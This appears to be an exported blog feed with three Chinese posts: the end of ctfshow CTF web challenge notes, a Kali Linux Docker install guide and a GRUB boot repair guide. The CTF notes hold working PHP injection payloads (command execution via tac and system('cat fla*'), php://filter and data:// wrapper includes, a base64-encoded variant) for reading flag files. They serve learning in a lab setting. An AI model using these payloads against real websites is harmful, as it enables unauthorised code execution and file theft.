title="web14"></a>web14</h4><h4 id="文件泄露（kindeditor编辑器漏洞，里面有个插入图片，点插入图片，如果目录下无文件，自动遍历到下一目录，直接可以知道flag路径信息）"><a href="#文件泄露（kindeditor编辑器漏洞，里面有个插入图片，点插入图片，如果目录下无文件，自动遍历到下一目录，直接可以知道flag路径信息）" class="headerlink" title="文件泄露（kindeditor编辑器漏洞，里面有个插入图片，点插入图片，如果目录下无文件，自动遍历到下一目录，直接可以知道flag路径信息）"></a>文件泄露（kindeditor编辑器漏洞，里面有个插入图片，点插入图片，如果目录下无文件，自动遍历到下一目录，直接可以知道flag路径信息）</h4><h4 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h4><h4 id="网站信息泄露（网站上泄露了管理员的qq邮箱，网站后台重置密码）"><a href="#网站信息泄露（网站上泄露了管理员的qq邮箱，网站后台重置密码）" class="headerlink" title="网站信息泄露（网站上泄露了管理员的qq邮箱，网站后台重置密码）"></a>网站信息泄露（网站上泄露了管理员的qq邮箱，网站后台重置密码）</h4><h4 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h4><h4 id="网站探针（tz-php-flag在phpinfo里）"><a href="#网站探针（tz-php-flag在phpinfo里）" class="headerlink" title="网站探针（tz.php,flag在phpinfo里）"></a>网站探针（tz.php,flag在phpinfo里）</h4><h4 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h4><h4 id="ip信息泄露（ping官网）"><a href="#ip信息泄露（ping官网）" class="headerlink" title="ip信息泄露（ping官网）"></a>ip信息泄露（ping官网）</h4><h4 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h4><h4 id="提示在js里面，unicode解码"><a href="#提示在js里面，unicode解码" class="headerlink" title="提示在js里面，unicode解码"></a>提示在js里面，unicode解码</h4><h4 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h4><h4 id="网站密码泄露（密钥在前端）"><a href="#网站密码泄露（密钥在前端）" class="headerlink" title="网站密码泄露（密钥在前端）"></a>网站密码泄露（密钥在前端）</h4><h4 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h4><h4 id="网站数据库文件泄露（-db-db-mdb）"><a href="#网站数据库文件泄露（-db-db-mdb）" class="headerlink" title="网站数据库文件泄露（/db/db.mdb）"></a>网站数据库文件泄露（/db/db.mdb）</h4><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">echo%</span><span class="bash">09`tac%09fl*`;<span class="hljs-comment">#可以</span></span><br>passthru(&#x27;tac%09fl*&#x27;);#不可以<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#%09和%20都表示空格</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#官方是这样解的，牛逼</span></span><br>show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><h3 id="web32-36哇呜呜，真想不到"><a href="#web32-36哇呜呜，真想不到" class="headerlink" title="web32-36哇呜呜，真想不到"></a>web32-36哇呜呜，真想不到</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">直接传参进去，利用POST或GET传参，再去通过php伪协议读取flag<br>payload如下：<br>GET型：?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br>POST型：?c=include<span class="hljs-variable">$_POST</span>[a]?&gt;再用post写数据：a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64.encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web37-data-协议，后面可以加php代码"><a href="#web37-data-协议，后面可以加php代码" class="headerlink" title="web37-data://协议，后面可以加php代码"></a>web37-data://协议，后面可以加php代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&#x27;cat fla*&#x27;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="web38-data-协议，这次我们要使用php的短标签"><a href="#web38-data-协议，这次我们要使用php的短标签" class="headerlink" title="web38-data://协议，这次我们要使用php的短标签"></a>web38-data://协议，这次我们要使用php的短标签</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&#x27;cat fla*&#x27;</span>)<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>还有一种解法</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>://text/plain;base<span class="hljs-number">64</span>,PD<span class="hljs-number">9</span>waHAgc<span class="hljs-number">3</span>lzdGVtKCdjYXQgZmxhZy<span class="hljs-number">5</span>waHAnKTs/Pg==<br></code></pre></td></tr></table></figure><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><h3 id="web90-intval-用小数绕过（4476-2）"><a href="#web90-intval-用小数绕过（4476-2）" class="headerlink" title="web90-intval(用小数绕过（4476.2）)"></a>web90-intval(用小数绕过（4476.2）)</h3><h3 id="CTF萌新"><a href="#CTF萌新" class="headerlink" title="CTF萌新"></a>CTF萌新</h3><p>web1 -奇怪，id=1000不可以，id=’1000’却可以，难道说’1000’是字符串？？？</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali Linux安装docker教程</title>
    <link href="/2021/11/01/kali%20linux%E5%AE%89%E8%A3%85docker/"/>
    <url>/2021/11/01/kali%20linux%E5%AE%89%E8%A3%85docker/</url>
    
    <content type="html"><![CDATA[<h3 id="1-使用的清华镜像"><a href="#1-使用的清华镜像" class="headerlink" title="1.使用的清华镜像:"></a>1.使用的清华镜像:</h3><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -<br></code></pre></td></tr></table></figure><h3 id="2-配置docker-apt-："><a href="#2-配置docker-apt-：" class="headerlink" title="2.配置docker apt ："></a>2.配置docker apt ：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list<br></code></pre></td></tr></table></figure><h3 id="3-更新apt"><a href="#3-更新apt" class="headerlink" title="3.更新apt:"></a>3.更新apt:</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br></code></pre></td></tr></table></figure><h3 id="4-安装docker："><a href="#4-安装docker：" class="headerlink" title="4.安装docker："></a>4.安装docker：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install docker-ce<br></code></pre></td></tr></table></figure><h3 id="5-查看docker版本："><a href="#5-查看docker版本：" class="headerlink" title="5.查看docker版本："></a>5.查看docker版本：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -v<br></code></pre></td></tr></table></figure><h3 id="6-查看docker运行状态："><a href="#6-查看docker运行状态：" class="headerlink" title="6.查看docker运行状态："></a>6.查看docker运行状态：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl status docker<br><br>或 sudo service docker status<br></code></pre></td></tr></table></figure><p>好了，安装完成了。</p>]]></content>
    
    
    <categories>
      
      <category>kali Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>kali Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali修复引导方法</title>
    <link href="/2021/11/01/kali%E4%BF%AE%E5%A4%8D%E5%BC%95%E5%AF%BC%E6%96%B9%E6%B3%95/"/>
    <url>/2021/11/01/kali%E4%BF%AE%E5%A4%8D%E5%BC%95%E5%AF%BC%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>win10更新系统后，发现自己的grub引导没了</p><h3 id="1-别慌，进BIOS在boot里面添加kali的efi引导"><a href="#1-别慌，进BIOS在boot里面添加kali的efi引导" class="headerlink" title="1.别慌，进BIOS在boot里面添加kali的efi引导"></a>1.别慌，进BIOS在boot里面添加kali的efi引导</h3><h3 id="2-进kali后，进入了grub-rescure模式，慢慢找。"><a href="#2-进kali后，进入了grub-rescure模式，慢慢找。" class="headerlink" title="2.进kali后，进入了grub rescure模式，慢慢找。"></a>2.进kali后，进入了grub rescure模式，慢慢找。</h3><p>先ls,查看分区情况</p><p>再ls (sd0,gpt1),一个一个找/boot/efi分区，反馈unknown的不管，出现其他的可能就是/boot分区</p><h3 id="3-如果找到了"><a href="#3-如果找到了" class="headerlink" title="3.如果找到了"></a>3.如果找到了</h3><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ls</span> (hd<span class="hljs-number">1</span>,gpt<span class="hljs-number">4</span>)/boot/grub<br></code></pre></td></tr></table></figure><p>会显示kali的efi配置文件</p><h3 id="4-之后输命令"><a href="#4-之后输命令" class="headerlink" title="4.之后输命令"></a>4.之后输命令</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> root=(hd1,gpt4)<br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">prefix=(hd1,gpt4)</span>/boot/<span class="hljs-comment">grub</span><br><br>insmod <span class="hljs-comment">normal</span><br><br>normal<br></code></pre></td></tr></table></figure><h3 id="5-进入kali系统后，打开终端。"><a href="#5-进入kali系统后，打开终端。" class="headerlink" title="5.进入kali系统后，打开终端。"></a>5.进入kali系统后，打开终端。</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">grub-install <span class="hljs-regexp">/dev/</span>sda (我的kali系统是装在<span class="hljs-regexp">/dev/</span>sda5)<br><br>update-grub<br></code></pre></td></tr></table></figure><p>reboot重启一下，大功告成。</p>]]></content>
    
    
    <categories>
      
      <category>kali Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali Linux</tag>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
